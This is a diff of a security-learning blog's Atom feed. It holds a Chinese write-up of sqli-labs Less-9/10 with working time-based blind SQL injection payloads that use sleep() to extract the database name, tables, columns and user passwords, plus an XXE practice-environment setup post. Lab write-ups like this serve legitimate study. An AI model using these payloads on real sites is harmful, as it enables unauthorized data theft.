@@ -191,19 +191,19 @@
   </entry>
   
   <entry>
-    <title>sqli-labs-Page-1-Less-9&amp;10</title>
+    <title>水水水水水水水水水水水水水</title>
     <link href="https://singlemindedt.github.io/2020/04/09/sqli-labs-Page-1-Less-9/"/>
     <id>https://singlemindedt.github.io/2020/04/09/sqli-labs-Page-1-Less-9/</id>
     <published>2020-04-09T00:50:00.000Z</published>
-    <updated>2020-07-29T11:19:56.501Z</updated>
+    <updated>2020-07-29T11:42:22.148Z</updated>
     
-    <content type="html"><![CDATA[<h2 id="Less-9（GET方式-盲注-基于时间-单引号）"><a href="#Less-9（GET方式-盲注-基于时间-单引号）" class="headerlink" title="Less-9（GET方式-盲注-基于时间-单引号）"></a>Less-9（GET方式-盲注-基于时间-单引号）</h2><p><img src="https://s1.ax1x.com/2020/04/09/Ghzoq0.png" alt="Ghzoq0.png"></p><p><strong>基于时间延迟注入：正确延迟，错误不延迟；</strong></p><p>具体操作与布尔型类似，这里需要用到sleep（）函数；</p><ol><li>爆库</li></ol><ul><li>库长</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and if(length(database())=8,sleep(5),1)<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/04/09/G4p8AK.png" alt="G4p8AK.png"></p><p>根据浏览器刷新的延迟程度，可以判断库长为8；</p><p>页面的回显并没有任何指示意思，即使是错误的判断也可返回<code>You are in.........</code>;</p><ul><li>库名</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and if(left(database(),1)='s',sleep(5),1)<span class="comment">--+</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and if(left(database(),2)='se',sleep(5),1)<span class="comment">--+</span></span><br></pre></td></tr></table></figure><ol start="2"><li>爆表</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and if( left((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>)=<span class="string">'e'</span> ,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="number">1</span>)<span class="comment">--</span></span><br></pre></td></tr></table></figure><p>第一个表首字母为’e’;</p><ol start="3"><li>爆字段</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and if(mid((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">4</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">8</span>)=<span class="string">'password'</span>,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="number">1</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure><ol start="4"><li>爆内容</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and if(substr((<span class="keyword">select</span> <span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)=<span class="string">'d'</span>,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="number">1</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>……</p><p>由于该方法与布尔报错型相似，只是用来表名正确的方式不同，因此不再赘述；</p><p>+++</p><h2 id="Less-10（GET方式-盲注-基于时间-双引号）"><a href="#Less-10（GET方式-盲注-基于时间-双引号）" class="headerlink" title="Less-10（GET方式-盲注-基于时间-双引号）"></a>Less-10（GET方式-盲注-基于时间-双引号）</h2><p>与第九关完全一致，仅把单引号改为了双引号闭合形式，只要更改一下参数后的符号即可；<br>例：库长</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1" and if(length(database())=8,sleep(5),1)<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/04/09/G4pfun.png" alt="G4pfun.png"></p><p>sleep()函数执行，页面延迟刷新，判断正确；<br>因为与Less-9基本一致，就不再赘述；</p>]]></content>
+    <content type="html"><![CDATA[<h2 id="Less-9（GET方式-盲注-基于时间-单引号）sqli-labs-Page-1-Less-9-amp-10"><a href="#Less-9（GET方式-盲注-基于时间-单引号）sqli-labs-Page-1-Less-9-amp-10" class="headerlink" title="Less-9（GET方式-盲注-基于时间-单引号）sqli-labs-Page-1-Less-9&amp;10"></a>Less-9（GET方式-盲注-基于时间-单引号）sqli-labs-Page-1-Less-9&amp;10</h2><p><img src="https://s1.ax1x.com/2020/04/09/Ghzoq0.png" alt="Ghzoq0.png"></p><p><strong>基于时间延迟注入：正确延迟，错误不延迟；</strong></p><p>具体操作与布尔型类似，这里需要用到sleep（）函数；</p><ol><li>爆库</li></ol><ul><li>库长</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and if(length(database())=8,sleep(5),1)<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/04/09/G4p8AK.png" alt="G4p8AK.png"></p><p>根据浏览器刷新的延迟程度，可以判断库长为8；</p><p>页面的回显并没有任何指示意思，即使是错误的判断也可返回<code>You are in.........</code>;</p><ul><li>库名</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and if(left(database(),1)='s',sleep(5),1)<span class="comment">--+</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and if(left(database(),2)='se',sleep(5),1)<span class="comment">--+</span></span><br></pre></td></tr></table></figure><ol start="2"><li>爆表</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and if( left((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>)=<span class="string">'e'</span> ,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="number">1</span>)<span class="comment">--</span></span><br></pre></td></tr></table></figure><p>第一个表首字母为’e’;</p><ol start="3"><li>爆字段</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and if(mid((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">4</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">8</span>)=<span class="string">'password'</span>,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="number">1</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure><ol start="4"><li>爆内容</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and if(substr((<span class="keyword">select</span> <span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)=<span class="string">'d'</span>,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="number">1</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>……</p><p>由于该方法与布尔报错型相似，只是用来表名正确的方式不同，因此不再赘述；</p><p>+++</p><h2 id="Less-10（GET方式-盲注-基于时间-双引号）"><a href="#Less-10（GET方式-盲注-基于时间-双引号）" class="headerlink" title="Less-10（GET方式-盲注-基于时间-双引号）"></a>Less-10（GET方式-盲注-基于时间-双引号）</h2><p>与第九关完全一致，仅把单引号改为了双引号闭合形式，只要更改一下参数后的符号即可；<br>例：库长</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1" and if(length(database())=8,sleep(5),1)<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/04/09/G4pfun.png" alt="G4pfun.png"></p><p>sleep()函数执行，页面延迟刷新，判断正确；<br>因为与Less-9基本一致，就不再赘述；</p>]]></content>
     
     <summary type="html">
     
       
       
-        &lt;h2 id=&quot;Less-9（GET方式-盲注-基于时间-单引号）&quot;&gt;&lt;a href=&quot;#Less-9（GET方式-盲注-基于时间-单引号）&quot; class=&quot;headerlink&quot; title=&quot;Less-9（GET方式-盲注-基于时间-单引号）&quot;&gt;&lt;/a&gt;Less-9（GET方
+        &lt;h2 id=&quot;Less-9（GET方式-盲注-基于时间-单引号）sqli-labs-Page-1-Less-9-amp-10&quot;&gt;&lt;a href=&quot;#Less-9（GET方式-盲注-基于时间-单引号）sqli-labs-Page-1-Less-9-amp-10&quot; class=&quot;h
       
     
     </summary>
@@ -375,6 +375,29 @@
   </entry>
   
   <entry>
+    <title>XXE-PHP Audit Basic</title>
+    <link href="https://singlemindedt.github.io/2020/02/29/XXE-PHP%20Audit%20Basic/"/>
+    <id>https://singlemindedt.github.io/2020/02/29/XXE-PHP Audit Basic/</id>
+    <published>2020-02-29T10:20:08.000Z</published>
+    <updated>2020-03-02T13:25:17.798Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="搭建XXE-PHP-Audit-Basic-环境"><a href="#搭建XXE-PHP-Audit-Basic-环境" class="headerlink" title="搭建XXE-PHP Audit Basic 环境"></a>搭建XXE-PHP Audit Basic 环境</h1><p><a href="https://github.com/vulnspy/phpaudit-XXE" target="_blank" rel="noopener">XXE-PHP Audit Basic</a><br>1.</p><ul><li>GitHub项目页Vulnspy提供了在线运行环境，单击<code>Vsplate GO&gt;</code>按钮可以创建在线环境，直接在上面操作即可；</li></ul><p><img src="https://s2.ax1x.com/2020/02/29/36SUD1.png" alt="36SUD1.png"><br>+++<br>2.</p><ul><li>将XXE-PHP Audit Basic文件下载下来解压至Phpstudy2018\PHPTutorial\WWW目录下；</li></ul><ul><li><p>开启Phpstudy2018的Apache和MySql服务;</p></li><li><p>访问<a href="http://127.0.0.1/phpaudit-XXE-master/" target="_blank" rel="noopener">http://127.0.0.1/phpaudit-XXE-master/</a> 即可；</p></li></ul><p><img src="https://s2.ax1x.com/2020/02/29/36SNuR.png" alt="36SNuR.png"></p><p><font color="#ff000" face="黑体" size="4">XXE漏洞(XML External Entity,XML外部实体注入攻击)：如果可以上传XML文档或者在XML文档中添加恶意内容，通过易受攻击的代码、依赖项，攻击者就能够攻击含有缺陷的XML处理器。</font></p><p>关于<a href="https://singlemindedt.github.io/2020/03/01/2020-03-1-XML/">XML</a>,相关<a href="https://singlemindedt.github.io/2020/02/29/2020-02-29-XXE-PHP-DOMDocument/">题目</a> :smile:</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;搭建XXE-PHP-Audit-Basic-环境&quot;&gt;&lt;a href=&quot;#搭建XXE-PHP-Audit-Basic-环境&quot; class=&quot;headerlink&quot; title=&quot;搭建XXE-PHP Audit Basic 环境&quot;&gt;&lt;/a&gt;搭建XXE-PHP Audi
+      
+    
+    </summary>
+    
+    
+      <category term="XXE" scheme="https://singlemindedt.github.io/tags/XXE/"/>
+    
+  </entry>
+  
+  <entry>
     <title>XXE-PHP Audit Basic详解</title>
     <link href="https://singlemindedt.github.io/2020/02/29/2020-02-29-XXE-PHP%20Audit%20Basic%E8%AF%A6%E8%A7%A3/"/>
     <id>https://singlemindedt.github.io/2020/02/29/2020-02-29-XXE-PHP Audit Basic详解/</id>
@@ -390,29 +413,6 @@
         &lt;p&gt;[TOC]&lt;br&gt;[5]:()&lt;/p&gt;
 &lt;p&gt;&lt;img src=&quot;https://s1.ax1x.com/2020/04/27/JfuUZn.png&quot; alt=&quot;JfuUZn.png&quot;&gt;&lt;/p&gt;
 &lt;h2 id=&quot;1-DOMDocument-php&quot;&gt;&lt;a href=&quot;#1-
-      
-    
-    </summary>
-    
-    
-      <category term="XXE" scheme="https://singlemindedt.github.io/tags/XXE/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>XXE-PHP Audit Basic</title>
-    <link href="https://singlemindedt.github.io/2020/02/29/XXE-PHP%20Audit%20Basic/"/>
-    <id>https://singlemindedt.github.io/2020/02/29/XXE-PHP Audit Basic/</id>
-    <published>2020-02-29T10:20:08.000Z</published>
-    <updated>2020-03-02T13:25:17.798Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="搭建XXE-PHP-Audit-Basic-环境"><a href="#搭建XXE-PHP-Audit-Basic-环境" class="headerlink" title="搭建XXE-PHP Audit Basic 环境"></a>搭建XXE-PHP Audit Basic 环境</h1><p><a href="https://github.com/vulnspy/phpaudit-XXE" target="_blank" rel="noopener">XXE-PHP Audit Basic</a><br>1.</p><ul><li>GitHub项目页Vulnspy提供了在线运行环境，单击<code>Vsplate GO&gt;</code>按钮可以创建在线环境，直接在上面操作即可；</li></ul><p><img src="https://s2.ax1x.com/2020/02/29/36SUD1.png" alt="36SUD1.png"><br>+++<br>2.</p><ul><li>将XXE-PHP Audit Basic文件下载下来解压至Phpstudy2018\PHPTutorial\WWW目录下；</li></ul><ul><li><p>开启Phpstudy2018的Apache和MySql服务;</p></li><li><p>访问<a href="http://127.0.0.1/phpaudit-XXE-master/" target="_blank" rel="noopener">http://127.0.0.1/phpaudit-XXE-master/</a> 即可；</p></li></ul><p><img src="https://s2.ax1x.com/2020/02/29/36SNuR.png" alt="36SNuR.png"></p><p><font color="#ff000" face="黑体" size="4">XXE漏洞(XML External Entity,XML外部实体注入攻击)：如果可以上传XML文档或者在XML文档中添加恶意内容，通过易受攻击的代码、依赖项，攻击者就能够攻击含有缺陷的XML处理器。</font></p><p>关于<a href="https://singlemindedt.github.io/2020/03/01/2020-03-1-XML/">XML</a>,相关<a href="https://singlemindedt.github.io/2020/02/29/2020-02-29-XXE-PHP-DOMDocument/">题目</a> :smile:</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h1 id=&quot;搭建XXE-PHP-Audit-Basic-环境&quot;&gt;&lt;a href=&quot;#搭建XXE-PHP-Audit-Basic-环境&quot; class=&quot;headerlink&quot; title=&quot;搭建XXE-PHP Audit Basic 环境&quot;&gt;&lt;/a&gt;搭建XXE-PHP Audi
       
     
     </summary>
